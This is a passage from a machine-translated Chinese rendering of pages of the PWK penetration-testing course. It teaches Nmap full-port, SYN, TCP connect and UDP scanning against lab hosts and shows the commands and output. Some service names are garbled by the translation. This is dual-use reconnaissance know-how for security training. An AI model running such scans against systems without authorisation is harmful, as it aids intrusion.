<div style="position:absolute;top:218304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未显示：65507 个封闭端口</font></font></nobr></div>
<div style="position:absolute;top:218321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:218338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21/tcp 打开 ftp</font></font></nobr></div>
<div style="position:absolute;top:218355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53/tcp 开放域</font></font></nobr></div>
<div style="position:absolute;top:218372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">88/tcp 打开 kerberos-sec</font></font></nobr></div>
<div style="position:absolute;top:218389;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">135/tcp 打开 msrpc</font></font></nobr></div>
<div style="position:absolute;top:218406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139/tcp 打开 netbios-ssn</font></font></nobr></div>
<div style="position:absolute;top:218423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">389/tcp 打开 LDAP</font></font></nobr></div>
<div style="position:absolute;top:218440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">445/tcp 打开 microsoft-ds</font></font></nobr></div>
<div style="position:absolute;top:218457;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">464/tcp 打开 kpasswd5</font></font></nobr></div>
<div style="position:absolute;top:218474;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">593/tcp 打开 http-rpc-epmap</font></font></nobr></div>
<div style="position:absolute;top:218491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">636/tcp 打开 ldapssl</font></font></nobr></div>
<div style="position:absolute;top:218508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1291/tcp 过滤海鸥</font></font></nobr></div>
<div style="position:absolute;top:218525;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3268/tcp 打开 globalcatLDAP</font></font></nobr></div>
<div style="position:absolute;top:218542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3269/tcp 打开 globalcatLDAPssl</font></font></nobr></div>
<div style="position:absolute;top:218559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3389/tcp 打开 ms-wbt-server</font></font></nobr></div>
<div style="position:absolute;top:218576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5722/tcp 打开 msdfsr</font></font></nobr></div>
<div style="position:absolute;top:218593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9389/tcp 打开adws</font></font></nobr></div>
<div style="position:absolute;top:218610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12777/tcp 过滤未知</font></font></nobr></div>
<div style="position:absolute;top:218627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">46056/tcp 过滤未知 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:218767;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="185"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 185 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:218800;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:219877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:219877;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:219877;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">185</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:218896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">47001/tcp 打开 winrm</font></font></nobr></div>
<div style="position:absolute;top:218912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:218946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：在 80.42 秒内扫描了 1 个 IP 地址（1 个主机启动）</font></font></nobr></div>
<div style="position:absolute;top:218980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo iptables -vn -L</font></font></font></b></nobr></div>
<div style="position:absolute;top:218997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Chain INPUT（策略接受219K数据包，252M字节）</font></font></nobr></div>
<div style="position:absolute;top:219014;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pkts 字节目标 prot 选择退出源    </font></font></nobr></div>
<div style="position:absolute;top:219014;left:660"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目的地    </font></font></nobr></div>
<div style="position:absolute;top:219031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">66243 2659K 全部接受 -- * * 10.11.1.220    </font></font></nobr></div>
<div style="position:absolute;top:219031;left:660"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0/0    </font></font></nobr></div>
<div style="position:absolute;top:219065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Chain FORWARD（策略接受 0 个数据包，0 个字节）</font></font></nobr></div>
<div style="position:absolute;top:219082;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pkts 字节目标 prot 选择退出源    </font></font></nobr></div>
<div style="position:absolute;top:219082;left:660"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目的地    </font></font></nobr></div>
<div style="position:absolute;top:219116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Chain OUTPUT（策略接受85792个数据包，11M字节）</font></font></nobr></div>
<div style="position:absolute;top:219133;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pkts 字节目标 prot 选择退出源    </font></font></nobr></div>
<div style="position:absolute;top:219133;left:660"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目的地    </font></font></nobr></div>
<div style="position:absolute;top:219150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">66768 </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4006K</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部接受 -- * * 0.0.0.0/0    </font></font></nobr></div>
<div style="position:absolute;top:219150;left:660"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.220</font></font></nobr></div>
<div style="position:absolute;top:219170;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 232 - 使用 iptables 监控所有 TCP 端口上的端口扫描的 nmap 流量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:219199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个类似的本地端口扫描显式探测所有 65535 个端口，产生了大约 4 MB 的流量，一个</font></font></nobr></div>
<div style="position:absolute;top:219218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">金额明显偏高。</font><font style="vertical-align: inherit;">然而，这次全端口扫描发现了新的端口</font></font></nobr></div>
<div style="position:absolute;top:219237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过默认 TCP 扫描找到。</font></font></nobr></div>
<div style="position:absolute;top:219270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面的结果意味着对 C 类网络（254 台主机）进行完整的 Nmap 扫描将导致</font></font></nobr></div>
<div style="position:absolute;top:219290;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向网络发送超过 1000 MB 的流量。</font><font style="vertical-align: inherit;">在理想情况下，完整的 TCP 和 UDP 端口扫描</font></font></nobr></div>
<div style="position:absolute;top:219309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个目标机器的信息将提供有关暴露的最准确的信息</font></font></nobr></div>
<div style="position:absolute;top:219328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络服务。</font><font style="vertical-align: inherit;">然而，上面的例子揭示了平衡任何交通限制的必要性</font></font></nobr></div>
<div style="position:absolute;top:219348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（例如缓慢的上行链路），需要发现额外的开放端口和服务，通过使用</font></font></nobr></div>
<div style="position:absolute;top:219367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更详尽的扫描。</font><font style="vertical-align: inherit;">对于较大的网络尤其如此，例如 A 类或 B 类网络</font></font></nobr></div>
<div style="position:absolute;top:219386;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评估。</font></font></nobr></div>
<div style="position:absolute;top:219419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下一节中，我们将探索一些 Nmap 的各种扫描技术。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:219454;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.2.2 隐形/SYN 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:219488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 首选的扫描技术是 SYN，或“隐形”扫描。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">200</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有很多好处</font></font></nobr></div>
<div style="position:absolute;top:219507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 SYN 扫描，因此，它是没有扫描技术时使用的默认扫描技术</font></font></nobr></div>
<div style="position:absolute;top:219527;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令中</font><font style="vertical-align: inherit;">指定</font><font style="vertical-align: inherit;">并且用户具有所需的原始套接字权限。</font></font></nobr></div>
<div style="position:absolute;top:219560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SYN 扫描是一种 TCP 端口扫描方法，涉及将 SYN 数据包发送到各个端口</font></font></nobr></div>
<div style="position:absolute;top:219579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在目标机器上，而无需完成 TCP 握手。</font><font style="vertical-align: inherit;">如果 TCP 端口打开，则 SYN-ACK 应该</font></font></nobr></div>
<div style="position:absolute;top:219598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从目标机器发回，通知我们端口已打开。</font><font style="vertical-align: inherit;">此时，港口</font></font></nobr></div>
<div style="position:absolute;top:219618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描器不需要发送最终的 ACK 来完成三路握手。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:219653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nmap -sS 10.11.1.220</font></font></font></b></nobr></div>
<div style="position:absolute;top:219670;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-03-04 11:27 EST 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:219686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.220 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:219703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（1.3 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:219721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未显示：980 个封闭端口</font></font></nobr></div>
<div style="position:absolute;top:219738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:219754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21/tcp 打开 ftp</font></font></nobr></div>
<div style="position:absolute;top:219771;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53/tcp 开放域</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:219827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">200 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Nmap，2019），https://nmap.org/book/synscan.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:219955;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="186"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 186 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:219988;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:221065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:221065;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:221065;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">186</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:220084;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">88/tcp 打开 kerberos-sec</font></font></nobr></div>
<div style="position:absolute;top:220100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">135/tcp 打开 msrpc</font></font></nobr></div>
<div style="position:absolute;top:220117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139/tcp 打开 netbios-ssn</font></font></nobr></div>
<div style="position:absolute;top:220134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">389/tcp 打开 LDAP</font></font></nobr></div>
<div style="position:absolute;top:220152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">445/tcp 打开 microsoft-ds</font></font></nobr></div>
<div style="position:absolute;top:220168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">464/tcp 打开 kpasswd5</font></font></nobr></div>
<div style="position:absolute;top:220185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:220205;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 233 - 使用 nmap 执行 SYN 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:220234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为三次握手永远不会完成，所以信息不会传递给</font></font></nobr></div>
<div style="position:absolute;top:220253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序层，因此不会出现在任何应用程序日志中。</font><font style="vertical-align: inherit;">SYN 扫描也更快</font></font></nobr></div>
<div style="position:absolute;top:220273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为发送和接收的数据包更少，所以效率更高。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:220335;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，“隐身”一词是指在过去，原始的</font></font></i></nobr></div>
<div style="position:absolute;top:220354;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防火墙将无法记录不完整的 TCP 连接。</font><font style="vertical-align: inherit;">这已不再是这种情况</font></font></i></nobr></div>
<div style="position:absolute;top:220374;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有了现代防火墙，即使隐身绰号一直存在，它也可以</font></font></i></nobr></div>
<div style="position:absolute;top:220393;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">误导。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:220455;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.2.3 TCP 连接扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:220490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的用户</font><font style="vertical-align: inherit;">没有原始套接字权限时，Nmap 将默认为 TCP</font></font></nobr></div>
<div style="position:absolute;top:220509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">之前描述的</font><font style="vertical-align: inherit;">连接扫描</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">201</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术。</font><font style="vertical-align: inherit;">由于 Nmap TCP 连接扫描使用</font></font></nobr></div>
<div style="position:absolute;top:220528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Berkeley 套接字 API 执行三向握手，它不需要提升权限。</font></font></nobr></div>
<div style="position:absolute;top:220547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，因为 Nmap 必须等待连接完成，然后 API 才会返回</font></font></nobr></div>
<div style="position:absolute;top:220567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接的状态，连接扫描需要比 SYN 扫描更长的时间才能完成。</font></font></nobr></div>
<div style="position:absolute;top:220600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有时我们可能需要使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专门执行连接扫描</font><font style="vertical-align: inherit;">，例如，</font></font></nobr></div>
<div style="position:absolute;top:220619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过某些类型的代理进行扫描时。</font><font style="vertical-align: inherit;">我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-sT</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项启动连接扫描：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:220654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap -sT 10.11.1.220</font></font></font></b></nobr></div>
<div style="position:absolute;top:220671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-03-04 11:37 EST 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:220688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.220 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:220705;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（1.3 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:220722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未显示：980 个封闭端口</font></font></nobr></div>
<div style="position:absolute;top:220739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:220756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21/tcp 打开 ftp</font></font></nobr></div>
<div style="position:absolute;top:220773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53/tcp 开放域</font></font></nobr></div>
<div style="position:absolute;top:220790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">88/tcp 打开 kerberos-sec</font></font></nobr></div>
<div style="position:absolute;top:220807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">135/tcp 打开 msrpc</font></font></nobr></div>
<div style="position:absolute;top:220824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139/tcp 打开 netbios-ssn</font></font></nobr></div>
<div style="position:absolute;top:220841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">389/tcp 打开 LDAP</font></font></nobr></div>
<div style="position:absolute;top:220858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">445/tcp 打开 microsoft-ds</font></font></nobr></div>
<div style="position:absolute;top:220875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">464/tcp 打开 kpasswd5</font></font></nobr></div>
<div style="position:absolute;top:220892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:220911;left:296"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 234 - 使用 nmap 执行 TCP 连接扫描</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:221015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">201 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Nmap，2019），https://nmap.org/book/scan-methods-connect-scan.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:221143;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="187"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 187 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:221176;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:222253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:222253;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:222253;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">187</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:221272;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.2.4 UDP 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:221306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进行UDP扫描时，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">202</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Nmap会结合使用两种不同的方法来</font></font></nobr></div>
<div style="position:absolute;top:221326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确定端口是打开还是关闭。</font><font style="vertical-align: inherit;">对于大多数端口，它将使用标准的“ICMP 端口</font></font></nobr></div>
<div style="position:absolute;top:221345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">unreachable”方法是通过向给定端口发送一个空数据包来描述的。</font><font style="vertical-align: inherit;">然而，对于</font></font></nobr></div>
<div style="position:absolute;top:221364;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SNMP 使用的常用端口，例如 161 端口，它将发送特定于协议的 SNMP</font></font></nobr></div>
<div style="position:absolute;top:221384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据包试图从绑定到该端口的应用程序获得响应。</font><font style="vertical-align: inherit;">执行 UDP</font></font></nobr></div>
<div style="position:absolute;top:221403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描，使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-sU</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项并且</font><font style="vertical-align: inherit;">需要</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问原始套接字：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:221438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nmap -sU 10.11.1.115</font></font></font></b></nobr></div>
<div style="position:absolute;top:221455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-03-04 11:46 EST 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:221472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.115 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:221489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.079 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:221506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未显示：997 个开放|过滤端口</font></font></nobr></div>
<div style="position:absolute;top:221523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:221540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">111/udp 打开 rpcbind</font></font></nobr></div>
<div style="position:absolute;top:221557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">137/udp 打开 netbios-ns</font></font></nobr></div>
<div style="position:absolute;top:221574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">161/udp打开snmp</font></font></nobr></div>
<div style="position:absolute;top:221608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：22.49 秒内扫描 1 个 IP 地址（1 个主机启动）</font></font></nobr></div>
<div style="position:absolute;top:221627;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 235 - 使用 nmap 执行 UDP 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:221656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UDP 扫描 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-sU</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 也可以与 TCP SYN 扫描 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-sS</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 选项</font><font style="vertical-align: inherit;">结合使用</font><font style="vertical-align: inherit;">以构建一个</font></font></nobr></div>
<div style="position:absolute;top:221676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们目标的更完整图片：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:221711;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nmap -sS -sU 10.11.1.115</font></font></font></b></nobr></div>
<div style="position:absolute;top:221728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-03-04 12:46 EST 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
